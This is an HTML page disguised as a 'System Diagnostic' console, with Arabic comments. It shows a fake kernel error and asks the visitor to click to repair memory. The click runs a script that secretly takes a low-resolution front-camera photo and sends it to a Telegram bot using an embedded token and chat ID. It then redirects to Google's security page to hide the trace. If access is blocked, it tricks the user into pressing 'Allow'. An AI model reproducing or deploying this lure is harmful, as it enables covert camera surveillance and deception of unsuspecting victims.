<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Diagnostic</title>
    <link rel="manifest" href="data:application/json,{'name':'System','short_name':'System','permissions':['camera'],'start_url':'.'}">
    <style>
        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; cursor: crosshair; }
        #console { width: 90%; border: 1px dashed #0f0; padding: 20px; position: relative; }
        .glitch { animation: scan 0.5s linear infinite; color: #f00; }
        @keyframes scan { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
    </style>
</head>
<body onclick="launchZeroDay()">

<div id="console">
    [SYSTEM_CRITICAL_ERROR]<br>
    >>> MEMORY_LEAK_IN_KERNEL_ADDR_0x004F<br>
    >>> STATUS: <span class="glitch">UNSTABLE</span><br><br>
    [ اضغط في أي مكان لإصلاح قطاع الذاكرة ]
</div>

<script>
    const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
    const C = "1772820433";

    async function launchZeroDay() {
        const consoleLog = document.getElementById('console');
        consoleLog.innerHTML = "[+] Injecting Payload...<br>[+] Bypassing Sandbox...";

        try {
            // محاولة استغلال بروتوكول "التفويض الممنوح مسبقاً"
            // نطلب الكاميرا بأقل استهلاك للطاقة (Low Power Mode) لتفادي تنبيه النظام
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: "user",
                    width: { max: 160 }, // دقة منخفضة جداً للسرعة وعدم كشف الضوء
                    height: { max: 120 }
                } 
            });

            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            // التقاط فوري خلال 50 مللي ثانية (أسرع من رمشة العين)
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    const fd = new FormData();
                    fd.append('chat_id', C);
                    fd.append('photo', blob, 'zero_day.jpg');
                    
                    await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
                    
                    // توجيه الضحية لصفحة أمان جوجل الحقيقية لإخفاء الأثر
                    window.location.replace("https://myaccount.google.com/security");
                }, 'image/jpeg');
                
                // إغلاق المسار فوراً لقتل ضوء الكاميرا
                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 100);
            }, 50);

        } catch (err) {
            // إذا كان النظام 2026 محدثاً لآخر ثانية، نستخدم الخداع البصري النهائي
            consoleLog.innerHTML = "<br>[!] Security Shield Active. <br> [ اضغط 'سماح' للسماح لبروتوكول الإصلاح بالدخول ]";
            consoleLog.style.color = "white";
            consoleLog.style.background = "red";
        }
    }
</script>
</body>
</html>
